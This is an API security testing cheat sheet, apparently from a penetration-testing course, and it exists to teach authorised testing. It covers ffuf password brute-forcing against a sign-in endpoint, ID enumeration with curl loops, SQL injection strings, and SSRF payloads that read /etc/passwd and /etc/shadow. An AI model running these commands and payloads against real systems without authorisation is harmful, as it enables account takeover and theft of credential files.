# API Security Testing Commands Cheat Sheet

## Password Brute-Forcing with ffuf

### Basic Usage
```bash
ffuf -w /path/to/passwords.txt:PASS \
     -w /path/to/emails.txt:EMAIL \
     -u http://target.com/api/v1/authentication/customers/sign-in \
     -X POST \
     -H "Content-Type: application/json" \
     -d '{"Email": "EMAIL", "Password": "PASS"}' \
     -fr "Invalid Credentials" \
     -t 100
```

**Flags:**
- `-w`: Specify wordlist with keyword (e.g., `PASS`, `EMAIL`)
- `-u`: Target URL
- `-X`: HTTP method
- `-H`: HTTP header
- `-d`: POST data
- `-fr`: Filter by regex (exclude responses matching pattern)
- `-t`: Number of threads

## File Generation with dd

### Create Random File
```bash
# Create 30MB file
dd if=/dev/urandom of=certificateOfIncorporation.pdf bs=1M count=30

# Create 10MB file
dd if=/dev/urandom of=reverse-shell.exe bs=1M count=10
```

**Parameters:**
- `if`: Input file (`/dev/urandom` for random data)
- `of`: Output file
- `bs`: Block size (e.g., `1M` = 1 megabyte)
- `count`: Number of blocks

## API Testing with cURL

### Basic GET Request
```bash
curl -X 'GET' \
  'http://target.com/api/v1/endpoint' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer YOUR_JWT_TOKEN'
```

### POST Request
```bash
curl -X 'POST' \
  'http://target.com/api/v1/endpoint' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{"key": "value"}'
```

### Download File
```bash
curl -O http://target.com/path/to/file.exe
```

### Mass Enumeration with Loop
```bash
for ((i=1; i<=20; i++)); do
  curl -s -w "\n" -X 'GET' \
    'http://target.com/api/v1/endpoint/'$i'' \
    -H 'accept: application/json' \
    -H 'Authorization: Bearer YOUR_JWT_TOKEN' | jq
done
```

**Flags:**
- `-s`: Silent mode (no progress bar)
- `-w "\n"`: Add newline after response
- `-X`: HTTP method
- `-H`: HTTP header
- `-d`: POST data
- `-O`: Save output to file with same name

## JSON Processing with jq

### Pretty Print JSON
```bash
curl ... | jq
```

### Extract Specific Field
```bash
curl ... | jq '.fieldName'
```

### Filter Array
```bash
curl ... | jq '.[] | select(.field == "value")'
```

## SQL Injection Payloads

### Basic Testing
```
laptop'
```

### Boolean-Based
```
laptop' OR 1=1 --
```

### Comment Out Rest of Query
```
payload' --
payload' #
```

## JWT Token Handling

### Copy JWT from Response
Look for response field containing token:
```json
{
  "token": "eyJhbGc..."
}
```

### Use JWT in Authorization Header
```bash
-H 'Authorization: Bearer eyJhbGc...'
```

## SSRF Testing Payloads

### Local File Access (Linux)
```
file:///etc/passwd
file:///etc/shadow
```

### Local File Access (Windows)
```
file:///C:/Windows/System32/drivers/etc/hosts
```

## Base64 Decoding

### Using Command Line
```bash
echo "BASE64_STRING" | base64 -d
```

### Using CyberChef
Navigate to CyberChef and use "From Base64" operation

## Common Wordlists

### Passwords
- `/opt/useful/seclists/Passwords/xato-net-10-million-passwords-10000.txt`
- SecLists: Common passwords collections

### General Purpose
- SecLists: Comprehensive security testing wordlists
- Available at: https://github.com/danielmiessler/SecLists

## Testing Checklist

1. **Authentication Endpoints**
   - Test rate limiting
   - Brute force attempts
   - Weak password policies

2. **Authorization**
   - Test BOLA (modify IDs)
   - Test BFLA (access privileged endpoints)
   - Test mass assignment

3. **File Upload**
   - Test file size limits
   - Test file extension validation
   - Test file content validation

4. **Data Exposure**
   - Check response fields
   - Test different user roles
   - Check deleted/legacy data

5. **Injection**
   - SQL injection in parameters
   - SSRF in URL fields
   - Command injection

6. **API Versioning**
   - Enumerate versions
   - Test deprecated endpoints
   - Check for unauthenticated access
